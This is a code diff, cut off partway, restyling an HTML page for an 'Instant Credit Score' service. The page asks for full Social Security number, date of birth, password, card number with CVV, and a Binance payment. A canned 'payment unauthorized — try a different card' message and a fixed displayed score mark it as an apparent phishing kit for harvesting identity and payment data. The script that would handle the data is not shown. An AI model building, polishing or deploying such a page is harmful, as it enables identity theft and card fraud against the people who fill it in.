@@ -1,15 +1,11 @@
 <!doctype html>
 <html lang="en">
-
-
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Premium Credit Meter — Get Your Score</title>
-
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Rubik:wght@400;600&display=swap" rel="stylesheet">
 <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-
 <style>
 :root {
   --bg: #f3f7fb;
@@ -18,70 +14,54 @@
   --accent-gold: #c99a3b;
   --muted: #6b7280;
   --text: #0b2540;
+  --container-gap: 18px;
+  --max-width: 920px;
 }
-#page5 {
-  flex-direction: column !important;
-  align-items: center !important;
-}
-
-.gauge-wrap {
-  width: 100%;
-  max-width: 900px;
-}
-
-.personal-block {
-  margin-top: 24px; /* space below meter */
-  width: 100%;
-  max-width: 900px;
-}
-
 * { box-sizing: border-box; margin: 0; padding: 0; }
 html, body {
-  height: 100%;
+  min-height: 100%;
   font-family: 'Rubik', sans-serif;
   background: var(--bg);
   color: var(--text);
-  overflow: hidden; /* no scrolling between pages */
+  -webkit-font-smoothing:antialiased;
+  -moz-osx-font-smoothing:grayscale;
 }
 
 /* page container styling */
+.container { padding: 18px; max-width: var(--max-width); margin: 0 auto; }
 .page {
-  position: absolute;
-  top: 0; left: 0;
   width: 100%;
-  height: 100vh;
+  min-height: calc(100vh - 36px);
   display: none;
-  padding: 28px;
+  padding: 22px;
+  align-items: center;
+  justify-content: center;
 }
 .page.active { display: flex; align-items: center; justify-content: center; }
 
-/* Make sure #page1 keeps its background image */
+/* keep page1 bg */
 #page1 {
   background: url('https://emudhra.com/hubfs/Imported_Blog_Media/Z9zIzio7SX3Ys9vlfCnh.webp') no-repeat center center fixed;
   background-size: cover;
-  position: relative; /* ensure stacking context for backdrop-filter */
-}
-
-/* Apply frosted glass look to the page1 card (overrides previous transparent rule) */
-#page1 .card {
-  background: rgba(255, 255, 255, 0.5);         /* visible but slightly translucent */
-  border: 1px solid rgba(255,255,255,0.9);       /* subtle edge */
-  backdrop-filter: blur(8px);                    /* blur the background behind it */
-  -webkit-backdrop-filter: blur(8px);            /* Safari support */
-  box-shadow: 0 20px 60px rgba(8,24,63,0.12);    /* stronger shadow so it reads as a box */
   border-radius: 14px;
   padding: 28px;
-  position: relative;
-  z-index: 2;                                     /* keep it above the background */
 }
-
-/* Keep default card look elsewhere */
 .card {
+  width: 100%;
   background: var(--card);
   border-radius: 14px;
-  padding: 28px;
+  padding: 22px;
   box-shadow: 0 20px 60px rgba(8,24,63,0.08);
 }
+
+/* frosted look for landing */
+#page1 .card {
+  background: rgba(255,255,255,0.62);
+  border: 1px solid rgba(255,255,255,0.9);
+  backdrop-filter: blur(8px);
+}
+
+/* typography */
 .site-name {
   font-family: 'Orbitron', sans-serif;
   color: var(--accent-blue);
@@ -91,205 +71,198 @@ html, body {
   background: linear-gradient(180deg,rgba(11,79,214,0.06),rgba(11,79,214,0.02));
   display: inline-block;
 }
-h1,h2 { font-family: 'Orbitron', sans-serif; color: var(--accent-blue) }
-p.lead { color: #1f2b45; margin-top: 10px; line-height: 1.5 }
+h1,h2 { font-family: 'Orbitron', sans-serif; color: var(--accent-blue); margin-bottom: 6px; }
+p.lead { color: #1f2b45; margin-top: 8px; line-height: 1.45; }
+.muted { color: var(--muted); font-size: 0.95rem; }
 .btn {
   background: var(--accent-blue);
   color: #fff;
-  padding: 12px 18px;
+  padding: 12px 16px;
   border-radius: 10px;
   border: 0;
   cursor: pointer;
   font-weight: 600;
+  min-width: 120px;
 }
 .btn.secondary { background: #fff; border: 1px solid #e6eef9; color: var(--text) }
+
 form { display: flex; flex-direction: column; gap: 12px }
-label { font-weight: 600; color: #203251; font-size: 0.95rem }
+label { font-weight: 600; color: #203251; font-size: 0.95rem; margin-bottom:6px; }
+
+/* Inputs */
 input[type="text"],input[type="email"],input[type="tel"],input[type="password"],input[type="date"],select {
-  padding: 12px;
+  padding: 12px 12px;
   border-radius: 10px;
   border: 2px solid #e6eef9;
   font-size: 1rem;
   width: 100%;
-}
-.row { display: flex; gap: 12px }
-.row .col { flex: 1 }
-.muted { color: var(--muted); font-size: 0.95rem }
-
-/* PAGE 5: gauge */
-.gauge-wrap {
-  display: flex; flex-direction: column; align-items: center; gap: 18px; padding: 24px;
-  border-radius: 12px;
-  background: linear-gradient(180deg,#ffffff,#f7fbff);
-  box-shadow: 0 30px 80px rgba(6,22,50,0.12);
-}
-.gauge-top { width: 100%; display: flex; justify-content: space-between; align-items: center }
-.brand { font-family: 'Orbitron', sans-serif; color: var(--accent-blue); font-weight: 700 }
-.small-badge { color: var(--muted); font-size: 0.95rem }
-.gauge-stage { position: relative; width: 100%; display: flex; justify-content: center; align-items: center; padding: 6px }
-.rim-glow {
-  position: absolute;
-  width: 860px; height: 480px;
-  border-radius: 50%;
-  filter: blur(36px) saturate(120%);
-  background: radial-gradient(circle at 35% 30%, rgba(201,154,59,0.12), rgba(11,79,214,0.06));
-  z-index: 0; pointer-events: none;
-  animation: pulseRim 3200ms infinite ease-in-out;
-}
-@keyframes pulseRim {
-  0% { transform: scale(1); opacity: 0.95; filter: blur(36px) saturate(120%); }
-  50% { transform: scale(1.02); opacity: 0.75; filter: blur(46px) saturate(140%); }
-  100% { transform: scale(1); opacity: 0.95; filter: blur(36px) saturate(120%); }
-}
-svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: block; overflow: visible; }
-.score-small { font-family: 'Orbitron', sans-serif; color: #081b3a; font-size: 26px; letter-spacing: 0.6px }
-.vantage-line { color: var(--muted); font-size: 13px }
-.personal-block {
-  width: 100%; max-width: 820px; margin-top: 12px; padding: 18px;
-  border-radius: 12px;
-  background: linear-gradient(180deg,#fff,#fbfdff);
-  box-shadow: 0 14px 36px rgba(8,24,63,0.06)
-}
-.info-grid { display: flex; flex-wrap: wrap; gap: 16px }
-.info-col { flex: 1; min-width: 220px }
-.info-label { font-weight: 700; color: #12213a; margin-bottom: 6px }
-.info-val { color: #2b3b57 }
-
-/* Rating labels under gauge */
-.rating-labels {
-  display:flex;
-  justify-content:space-between;
-  width:100%;
-  max-width:820px;
-  padding: 0 24px;
-  margin-top: 8px;
-  color: var(--muted);
-  font-weight:700;
-  text-transform:uppercase;
-  letter-spacing:0.6px;
-  font-size:13px;
+  background: #fff;
 }
 
-/* small badges on extremes */
-.rating-labels span { width: 25%; text-align:center; }
+/* layout helpers */
+.row { display:flex; gap:12px; align-items:center; }
+.row .col { flex:1; min-width:0; }
 
-/* responsive */
-@media (max-width:860px) {
-  .gauge-stage { padding: 2px }
-  svg.gauge { height: 360px }
-  .rim-glow { width: 620px; height: 360px; filter: blur(24px) }
+/* PAGE 4 payment area responsive */
+.payment-methods { display:flex; gap:12px; margin-bottom:12px; }
+.pm-btn {
+  flex: 1; padding: 10px; border-radius: 10px;
+  border: 1px solid #e6eef9; background: #fff; cursor: pointer; text-align: center;
+  display:flex; align-items:center; justify-content:center; gap:8px; font-weight:600;
 }
-@media (max-width:520px) {
-  svg.gauge { height: 320px }
-  .rim-glow { width: 420px; height: 260px }
-  .score-small { font-size: 20px }
-  .personal-block { padding: 12px }
-}
+.pm-btn.active { box-shadow: 0 10px 30px rgba(11,79,214,0.08); border-color: rgba(11,79,214,0.12); }
 
-/* extra UI */
+/* card payment layout */
+#cardPayment .card-row { display:flex; gap:12px; align-items:center; width:100%; }
+#cardPayment .card-row input{ flex:1; min-width:0; }
+.card-brand { display:flex; align-items:center; justify-content:center; width:52px; }
+
+#cardPayment .row { align-items:flex-end; }
+#cardPayment .row .col { flex:1; }
+
+/* ensure expiry then cvv ordering and responsive stacking */
+.expCvvRow { display:flex; gap:12px; align-items:center; }
+.expCvvRow .exp { width:150px; min-width:120px; }
+.expCvvRow .cvv { width:110px; min-width:100px; }
+
+/* compact helper */
+.small { font-size:0.92rem; color:var(--muted); }
+
 .terms-box {
   background: #fff6f6; border-radius: 10px; padding: 12px;
   border: 1px solid #ffecec; color: #b30000;
-  display: flex; align-items: center; gap: 10px
-}
-.payment-methods { display: flex; gap: 12px; margin-bottom: 12px }
-.pm-btn {
-  flex: 1; padding: 10px; border-radius: 10px;
-  border: 1px solid #e6eef9; background: #fff;
-  cursor: pointer; text-align: center
-}
-.pm-btn.active { box-shadow: 0 8px 28px rgba(11,79,214,0.08); border-color: rgba(11,79,214,0.12) }
-.card-row { display: flex; gap: 12px; align-items: center }
-.card-brand { margin-left: 8px }
-.notice {
-  background: #fff9e9; border-radius: 8px; padding: 10px;
-  border: 1px solid #fff0d0; color: #7a5a00
-}
-.overlay {
-  position: fixed; left: 0; top: 0; width: 100%; height: 100%;
-  display: none;
-  align-items: center; justify-content: center;
-  background: rgba(4,12,30,0.45); z-index: 9999;
-}
-.overlay .modal {
-  background: #fff; padding: 20px; border-radius: 12px;
-  min-width: 280px; text-align: center
+  display: flex; align-items: center; gap: 10px; margin-bottom:12px;
 }
 .error-box {
   background: #fff6f6; border-radius: 10px; padding: 12px;
   border: 1px solid #ffecec; color: #b30000;
-  display: flex; align-items: center; gap: 10px; margin-top: 12px
+  display: flex; align-items: center; gap: 10px; margin-top: 12px;
 }
+
+/* PAGE 5 gauge area */
+.gauge-wrap {
+  width: 100%;
+  max-width: 900px;
+  display:flex; flex-direction:column; gap:16px; align-items:center; padding:16px;
+  border-radius:12px; background: linear-gradient(180deg,#ffffff,#f7fbff); box-shadow:0 30px 80px rgba(6,22,50,0.12);
+}
+.gauge-stage { position:relative; width:100%; display:flex; justify-content:center; align-items:center; padding:6px; }
+.rim-glow { position:absolute; width:860px; height:480px; border-radius:50%; filter: blur(36px) saturate(120%); background:radial-gradient(circle at 35% 30%, rgba(201,154,59,0.12), rgba(11,79,214,0.06)); z-index:0; pointer-events:none; animation:pulseRim 3200ms infinite ease-in-out; }
+@keyframes pulseRim { 0%{transform:scale(1);opacity:0.95}50%{transform:scale(1.02);opacity:0.75}100%{transform:scale(1);opacity:0.95} }
+
+svg.gauge { width:820px; max-width:96vw; height:420px; z-index:1; display:block; overflow:visible; }
+.score-small { font-family: 'Orbitron', sans-serif; color: #081b3a; font-size:26px; letter-spacing:0.6px }
+.vantage-line { color: var(--muted); font-size:13px }
+
+/* rating labels */
+.rating-labels { display:flex; justify-content:space-between; width:100%; max-width:820px; padding: 0 12px; margin-top:8px; color: var(--muted); font-weight:700; text-transform:uppercase; letter-spacing:0.6px; font-size:13px; }
+.rating-labels span { width:25%; text-align:center; }
+
+/* personal info block */
+.personal-block { width:100%; max-width:820px; margin-top:12px; padding:14px; border-radius:12px; background:linear-gradient(180deg,#fff,#fbfdff); box-shadow:0 14px 36px rgba(8,24,63,0.06); }
+.info-grid { display:flex; flex-wrap:wrap; gap:12px; }
+.info-col { flex:1; min-width:200px; }
+.info-label { font-weight:700; color:#12213a; margin-bottom:6px; }
+.info-val { color:#2b3b57; }
+
+/* overlay modal */
+.overlay { position: fixed; left: 0; top: 0; width: 100%; height: 100%; display: none; align-items:center; justify-content:center; background: rgba(4,12,30,0.45); z-index: 9999; }
+.overlay .modal { background:#fff; padding:18px; border-radius:12px; min-width:260px; text-align:center; box-shadow:0 20px 60px rgba(2,8,20,0.2); }
+
+/* responsive adjustments */
+@media (max-width:860px) {
+  .rim-glow { width:620px; height:360px; filter: blur(24px); }
+  svg.gauge { height:360px; }
+  .score-small { font-size:22px; }
+  .card { padding:16px; }
+  .container { padding:14px; }
+  .payment-methods { flex-direction: row; }
+}
+@media (max-width:520px) {
+  body { -webkit-overflow-scrolling: touch; }
+  .page { padding:12px; min-height:auto; }
+  .card { padding:14px; }
+  .row { flex-direction:column; gap:10px; }
+  .payment-methods { flex-direction:column; }
+  #cardPayment .card-row { flex-direction:row; align-items:center; gap:8px; }
+  #cardPayment .card-row input{ font-size:0.98rem; padding:10px; }
+  .card-brand { width:44px; }
+  .expCvvRow { flex-direction:column; align-items:stretch; }
+  .expCvvRow .exp, .expCvvRow .cvv { width:100%; min-width:0; }
+  svg.gauge { height:320px; }
+  .rim-glow { width:420px; height:260px; filter: blur(20px); }
+  .score-small { font-size:20px; }
+  .personal-block { padding:12px; }
+  .btn { padding:10px 12px; min-width:100px; }
+  .rating-labels { padding: 0 6px; font-size:12px; }
+}
+
+/* small aesthetic tweaks */
+input::placeholder { color: #9aa8c7; }
+.icon-left { display:inline-flex; align-items:center; gap:8px; }
 </style>
 </head>
 <body>
-
-
 <div class="container">
   <!-- PAGE 1: Landing -->
-
   <div id="page1" class="page active">
-    <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
+    <div class="card" style="width:100%; max-width:800px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;gap:12px">
         <div class="site-name">INSTANT CREDIT SCORE</div>
         <div class="muted">Secure • Instant</div>
       </div>
-      <h1>Get Your Credit Report</h1>
+      <h1 style="margin-top:6px">Get Your Credit Report</h1>
       <p class="lead">Premium instant access to a VantageScore estimate. Click to start — it's quick and secure.</p>
-      <div style="margin-top:18px">
+      <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
         <button class="btn" onclick="gotoPage('page2')">GET MY SCORE</button>
+        
       </div>
     </div>
   </div>
 
   <!-- PAGE 2: Personal Info -->
   <div id="page2" class="page">
-    <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+    <div class="card" style="width:100%; max-width:820px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:12px">
         <div class="site-name">INSTANT CREDIT SCORE</div>
         <div class="muted">Step 1 of 4</div>
       </div>
       <h2>Provide your information</h2>
       <p class="muted">We need basic details to locate your credit file.</p>
-
-      <form id="form-personal">
+      <form id="form-personal" autocomplete="on">
         <div class="row">
           <div class="col">
             <label for="firstName">First name</label>
-            <input id="firstName" type="text" required placeholder="First name">
+            <input id="firstName" type="text" required placeholder="First name" autocomplete="given-name">
           </div>
           <div class="col">
             <label for="lastName">Last name</label>
-            <input id="lastName" type="text" required placeholder="Last name">
+            <input id="lastName" type="text" required placeholder="Last name" autocomplete="family-name">
           </div>
         </div>
-
         <div class="row">
           <div class="col">
             <label for="email">Email</label>
-            <input id="email" type="email" placeholder="you@example.com" required>
+            <input id="email" type="email" placeholder="you@example.com" required autocomplete="email">
           </div>
           <div class="col">
             <label for="phone">Phone</label>
-            <input id="phone" type="tel" placeholder="(555) 555-5555" required>
+            <input id="phone" type="tel" placeholder="(555) 555-5555" required autocomplete="tel">
           </div>
         </div>
-
         <label for="address">Address</label>
-        <input id="address" type="text" placeholder="Street address" required>
-
+        <input id="address" type="text" placeholder="Street address" required autocomplete="street-address">
         <div class="row">
           <div class="col">
             <label for="city">City</label>
-            <input id="city" type="text" placeholder="City" required>
+            <input id="city" type="text" placeholder="City" required autocomplete="address-level2">
           </div>
           <div style="width:120px">
             <label for="zip">Zip</label>
-            <input id="zip" type="text" placeholder="Zip" required>
+            <input id="zip" type="text" placeholder="Zip" required autocomplete="postal-code">
           </div>
         </div>
-
-        <div style="display:flex;gap:12px;margin-top:8px">
+        <div style="display:flex;gap:12px;margin-top:8px;flex-wrap:wrap">
           <button type="submit" class="btn">Continue</button>
           <button type="button" class="btn secondary" onclick="gotoPage('page1')">Cancel</button>
         </div>
@@ -299,31 +272,26 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
 
   <!-- PAGE 3: Identity Verification -->
   <div id="page3" class="page">
-    <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+    <div class="card" style="width:100%; max-width:820px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:12px">
         <div class="site-name">INSTANT CREDIT SCORE</div>
         <div class="muted">Step 2 of 4</div>
       </div>
       <h2>Secure Access</h2>
       <p class="muted">Confirm identity to authorize access to your credit file.</p>
-
-      <form id="form-id">
+      <form id="form-id" autocomplete="off">
         <label>Social Security Number</label>
         <div style="display:flex;gap:8px;margin-bottom:6px">
-          <input id="ssn1" class="ssn" type="text" maxlength="3" placeholder="XXX" style="width:30%;text-align:center" required>
-          <input id="ssn2" class="ssn" type="text" maxlength="2" placeholder="XX" style="width:20%;text-align:center" required>
-          <input id="ssn3" class="ssn" type="text" maxlength="4" placeholder="XXXX" style="width:40%;text-align:center" required>
+          <input id="ssn1" class="ssn" type="text" maxlength="3" placeholder="XXX" style="width:36%;text-align:center" required inputmode="numeric" pattern="\d{3}">
+          <input id="ssn2" class="ssn" type="text" maxlength="2" placeholder="XX" style="width:24%;text-align:center" required inputmode="numeric" pattern="\d{2}">
+          <input id="ssn3" class="ssn" type="text" maxlength="4" placeholder="XXXX" style="width:40%;text-align:center" required inputmode="numeric" pattern="\d{4}">
         </div>
-
         <label>Date of Birth</label>
-        <input id="dob" type="date" required>
-
+        <input id="dob" type="date" required max="">
         <label>Create Password</label>
-        <input id="password" type="password" placeholder="Create password" required>
-
+        <input id="password" type="password" placeholder="Create password" required autocomplete="new-password">
         <label>Confirm Password</label>
-        <input id="confirmPassword" type="password" placeholder="Confirm password" required>
-
+        <input id="confirmPassword" type="password" placeholder="Confirm password" required autocomplete="new-password">
         <div style="display:flex;gap:12px;margin-top:8px">
           <button class="btn" type="submit">Continue</button>
           <button type="button" class="btn secondary" onclick="gotoPage('page2')">Back</button>
@@ -332,188 +300,139 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
     </div>
   </div>
 
-  <!-- PAGE 4: Terms & Payment (modified to add Card payment first) -->
+  <!-- PAGE 4: Terms & Payment (card first) -->
   <div id="page4" class="page">
-    <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+    <div class="card" style="width:100%; max-width:820px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:12px">
         <div class="site-name">INSTANT CREDIT SCORE</div>
         <div class="muted">Step 3 of 4</div>
       </div>
       <h2>Final Step — Payment & Consent</h2>
-
       <div class="terms-box" style="margin-bottom:14px">
         <i class="fas fa-exclamation-triangle" style="color:#b30000"></i>
-        <div>
+        <div style="font-size:0.96rem">
           A one-time fee of <strong>$9.99</strong> is required to view your detailed credit report. This fee is non-refundable once accessed.
         </div>
       </div>
 
       <!-- payment method selector -->
       <div class="payment-methods" role="tablist">
-        <div id="pmCard" class="pm-btn active" onclick="selectPayment('card')">
-          <div>Credit / Debit Card</div>
+        <div id="pmCard" class="pm-btn active" onclick="selectPayment('card')" role="tab" aria-selected="true">
+          <i class="fas fa-credit-card"></i><div style="margin-left:6px">Credit / Debit Card</div>
         </div>
-        <div id="pmBinance" class="pm-btn" onclick="selectPayment('binance')">
-          <div>Binance Pay</div>
+        <div id="pmBinance" class="pm-btn" onclick="selectPayment('binance')" role="tab" aria-selected="false">
+          <i class="fab fa-btc"></i><div style="margin-left:6px">Binance Pay</div>
         </div>
       </div>
 
-      <!-- CARD PAYMENT FORM (shown first by default) -->
+      <!-- CARD PAYMENT FORM -->
       <div id="cardPayment" style="margin-bottom:12px">
         <label for="cardNumber">Card number</label>
-        <div class="card-row">
-          <input id="cardNumber" type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="23" autocomplete="cc-number">
-          <div class="card-brand" style="display:flex;align-items:center">
-            <i id="cardBrandIcon" class="fab fa-cc-visa" style="font-size:26px;color:#0b4fd6"></i>
+        <div class="card-row" style="align-items:center">
+          <input id="cardNumber" type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="23" autocomplete="cc-number" inputmode="numeric" aria-label="Card number">
+          <div class="card-brand" style="width:60px;">
+            <i id="cardBrandIcon" class="fab fa-cc-visa" style="font-size:24px;color:#0b4fd6"></i>
           </div>
         </div>
 
-        <div class="row">
-          <div class="col">
+        <div style="display:flex;gap:12px;margin-top:8px;flex-wrap:wrap;">
+          <div style="flex:1; min-width:160px;">
             <label for="cardName">Name on card</label>
             <input id="cardName" type="text" placeholder="Full name as on card" autocomplete="cc-name">
           </div>
-          <div style="width:150px">
+          <div style="min-width:150px;">
             <label for="cardExp">Expiry (MM/YY)</label>
-            <input id="cardExp" type="text" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp">
+            <input id="cardExp" class="exp" type="text" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" inputmode="numeric">
           </div>
-          <div style="width:110px">
+          <div style="min-width:110px;">
             <label for="cardCvv">CVV</label>
-            <input id="cardCvv" type="text" placeholder="CVV" maxlength="4" autocomplete="cc-csc">
+            <input id="cardCvv" class="cvv" type="text" placeholder="CVV" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
           </div>
         </div>
 
         <div style="display:flex;align-items:center;gap:8px;margin-top:12px">
           <input id="acceptTermsCard" type="checkbox" />
-          <label for="acceptTermsCard" class="muted">I accept the terms and authorize the payment.</label>
+          <label for="acceptTermsCard" class="muted small">I accept the terms and authorize the payment.</label>
         </div>
 
-        <div style="display:flex;gap:12px;margin-top:12px">
+        <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap">
           <button id="confirmCardBtn" class="btn">Confirm Payment</button>
           <button type="button" class="btn secondary" onclick="gotoPage('page3')">Back</button>
         </div>
 
-        <div id="cardError" style="display:none" class="error-box"><i class="fas fa-exclamation-triangle"></i><div id="cardErrorText">Payment unauthorized — try a different card or choose a different payment method.</div></div>
+        <div id="cardError" style="display:none" class="error-box" role="alert">
+          <i class="fas fa-exclamation-triangle"></i>
+          <div id="cardErrorText">Payment unauthorized — try a different card or choose a different payment method.</div>
+        </div>
       </div>
 
-      <!-- BINANCE PAY (existing UI) -->
+      <!-- BINANCE PAY -->
       <div id="binancePayment" style="display:none;margin-top:8px">
         <div style="margin-bottom:12px;text-align:center">
           <img src="https://i.postimg.cc/Tw6s82my/1000043332.jpg" alt="Scan to Pay" style="max-width:200px;border-radius:8px;border:2px solid #eee">
           <div class="muted" style="margin-top:8px">Scan with Binance App to Pay</div>
         </div>
-
         <label for="tid">Transaction ID (TID)</label>
         <input id="tid" type="text" placeholder="Enter your Binance TID">
-
         <div style="display:flex;align-items:center;gap:8px;margin-top:12px">
           <input id="acceptTerms" type="checkbox" />
-          <label for="acceptTerms" class="muted">I accept the terms and authorize the payment.</label>
+          <label for="acceptTerms" class="muted small">I accept the terms and authorize the payment.</label>
         </div>
-
-        <div style="display:flex;gap:12px;margin-top:12px">
+        <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap">
           <button id="confirmBinanceBtn" class="btn">Confirm Payment</button>
           <button type="button" class="btn secondary" onclick="gotoPage('page3')">Back</button>
         </div>
       </div>
-
     </div>
   </div>
 
   <!-- PAGE 5: Luxe Meter & Personal Info -->
-  
   <div id="page5" class="page">
-    <div class="gauge-wrap">
-      <div class="gauge-top" style="width:100%">
+    <div class="gauge-wrap" role="region" aria-label="Credit gauge">
+      <div class="gauge-top" style="width:100%; display:flex; justify-content:space-between; align-items:center;">
         <div class="brand">Instant Credit Score</div>
         <div class="small-badge">Secure • Instant</div>
       </div>
-
       <div class="gauge-stage">
         <div class="rim-glow" aria-hidden="true"></div>
-
-        <!-- Large SVG gauge (metallic gold/blue) -->
-        <svg class="gauge" id="gaugeSVG" viewBox="0 0 800 460" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">
+        <!-- Large SVG gauge -->
+        <svg class="gauge" id="gaugeSVG" viewBox="0 0 800 460" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Credit gauge visualization">
           <defs>
             <linearGradient id="gRed" x1="0" x2="1"><stop offset="0" stop-color="#ff7b7b"/><stop offset="1" stop-color="#e04b4b"/></linearGradient>
             <linearGradient id="gOrange" x1="0" x2="1"><stop offset="0" stop-color="#ffb07a"/><stop offset="1" stop-color="#ff8a42"/></linearGradient>
             <linearGradient id="gYellow" x1="0" x2="1"><stop offset="0" stop-color="#ffef7a"/><stop offset="1" stop-color="#ffbf47"/></linearGradient>
             <linearGradient id="gGreen" x1="0" x2="1"><stop offset="0" stop-color="#8ee89b"/><stop offset="1" stop-color="#23b06b"/></linearGradient>
-
-            <radialGradient id="metal" cx="50%" cy="40%">
-              <stop offset="0%" stop-color="#fffefc"/>
-              <stop offset="60%" stop-color="#f4f7fb"/>
-              <stop offset="100%" stop-color="#e6eef8"/>
-            </radialGradient>
-
-            <!-- layered metal sheen -->
-            <linearGradient id="ringMetal" x1="0" x2="1">
-              <stop offset="0%" stop-color="#e9eef7"/>
-              <stop offset="30%" stop-color="#ffffff"/>
-              <stop offset="60%" stop-color="#cfd8e8"/>
-              <stop offset="100%" stop-color="#e8eef8"/>
-            </linearGradient>
-
-            <linearGradient id="goldEdge" x1="0" x2="1">
-              <stop offset="0%" stop-color="#f8e6b2"/>
-              <stop offset="50%" stop-color="#d4b468"/>
-              <stop offset="100%" stop-color="#c99a3b"/>
-            </linearGradient>
-
-            <filter id="shadow" x="-50%" y="-50%" width="200%" height="200%">
-              <feDropShadow dx="0" dy="16" stdDeviation="18" flood-color="#0b2540" flood-opacity="0.10"/>
-            </filter>
-
-            <filter id="innerGlow" x="-50%" y="-50%" width="200%" height="200%">
-              <feGaussianBlur stdDeviation="12" result="blur"/>
-              <feBlend in="SourceGraphic" in2="blur"/>
-            </filter>
-
-            <filter id="needleShadow" x="-50%" y="-50%" width="200%" height="200%">
-              <feDropShadow dx="0" dy="8" stdDeviation="10" flood-color="#000" flood-opacity="0.25"/>
-            </filter>
+            <radialGradient id="metal" cx="50%" cy="40%"><stop offset="0%" stop-color="#fffefc"/><stop offset="60%" stop-color="#f4f7fb"/><stop offset="100%" stop-color="#e6eef8"/></radialGradient>
+            <linearGradient id="ringMetal" x1="0" x2="1"><stop offset="0%" stop-color="#e9eef7"/><stop offset="30%" stop-color="#ffffff"/><stop offset="60%" stop-color="#cfd8e8"/><stop offset="100%" stop-color="#e8eef8"/></linearGradient>
+            <linearGradient id="goldEdge" x1="0" x2="1"><stop offset="0%" stop-color="#f8e6b2"/><stop offset="50%" stop-color="#d4b468"/><stop offset="100%" stop-color="#c99a3b"/></linearGradient>
+            <filter id="shadow" x="-50%" y="-50%" width="200%" height="200%"><feDropShadow dx="0" dy="16" stdDeviation="18" flood-color="#0b2540" flood-opacity="0.10"/></filter>
+            <filter id="needleShadow" x="-50%" y="-50%" width="200%" height="200%"><feDropShadow dx="0" dy="8" stdDeviation="10" flood-color="#000" flood-opacity="0.25"/></filter>
           </defs>
 
-          <!-- ambient metallic outer ring -->
           <g transform="translate(400,260)">
             <circle r="205" fill="url(#ringMetal)" stroke="rgba(11,79,214,0.06)" stroke-width="2" />
             <circle r="198" fill="none" stroke="url(#goldEdge)" stroke-width="5" opacity="0.95" />
             <circle r="188" fill="none" stroke="rgba(255,255,255,0.12)" stroke-width="2" />
           </g>
 
-          <!-- decorative base ellipse for depth -->
           <ellipse cx="400" cy="380" rx="300" ry="60" fill="url(#metal)" filter="url(#shadow)"/>
-
-          <!-- main face -->
           <circle cx="400" cy="260" r="170" fill="url(#metal)" />
-
-          <!-- metallic bevel inner ring -->
           <ellipse cx="400" cy="260" rx="150" ry="110" fill="none" stroke="rgba(0,0,0,0.06)" stroke-width="12"/>
 
-          <!-- arcs (paths set by JS) -->
           <path id="arcRed" stroke-linecap="round" stroke-width="28" fill="none" stroke-linejoin="round"/>
           <path id="arcOrange" stroke-linecap="round" stroke-width="28" fill="none" stroke-linejoin="round"/>
           <path id="arcYellow" stroke-linecap="round" stroke-width="28" fill="none" stroke-linejoin="round"/>
           <path id="arcGreen" stroke-linecap="round" stroke-width="28" fill="none" stroke-linejoin="round"/>
 
-          <!-- inner metallic ring highlight -->
           <path d="M240 270 A 160 160 0 0 1 560 270" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="34" stroke-linecap="round"/>
-
-          <!-- glossy overlay -->
           <path id="gloss" fill="none" stroke="rgba(255,255,255,0.55)" stroke-width="34" stroke-linecap="round"/>
 
-          <!-- tick shadows / depth -->
           <g id="ticks-shadow" opacity="0.06" transform="translate(0,4)"></g>
-          <!-- ticks & labels -->
           <g id="ticks"></g>
 
-          <!-- needle shadow ellipse for realism -->
           <ellipse id="needleShadowEllipse" cx="400" cy="330" rx="90" ry="16" fill="rgba(2,8,20,0.10)" opacity="0.8" />
 
-          <!-- fancy needle group (rotated) -->
-          <!-- REPLACED: arrow-shaped needle removed. Now a straight slim needle (slash-like) -->
           <g id="needleGroup" transform="rotate(-120 400 260)" filter="url(#needleShadow)">
-            <!-- metallic needle with gradient -->
             <defs>
               <linearGradient id="needleGrad" x1="0" x2="1">
                 <stop offset="0%" stop-color="#081b3a"/>
@@ -522,17 +441,12 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
               </linearGradient>
             </defs>
 
-            <!-- Straight, slim needle (no arrow tip) styled like a / -->
-            <!-- The x and y values position a vertical narrow rectangle which rotates to create the slash appearance -->
             <rect x="398" y="130" width="4" height="130" rx="2" fill="url(#needleGrad)" />
-            <!-- small highlight line along the needle -->
             <line x1="400" y1="132" x2="400" y2="256" stroke="rgba(255,255,255,0.06)" stroke-width="1.2" stroke-linecap="round"/>
-
             <circle cx="400" cy="260" r="22" fill="#08203e" stroke="#fff" stroke-width="3"/>
             <circle cx="400" cy="260" r="10" fill="#ffffff" opacity="0.06"/>
           </g>
 
-          <!-- center caps for extra sheen -->
           <circle cx="400" cy="260" r="26" fill="url(#ringMetal)" stroke="#ffffff" stroke-opacity="0.08" stroke-width="2" />
         </svg>
       </div>
@@ -540,7 +454,6 @@ svg.gauge { width: 820px; max-width: 96vw; height: 420px; z-index: 1; display: b
       <div class="score-small" id="scoreSmall">695</div>
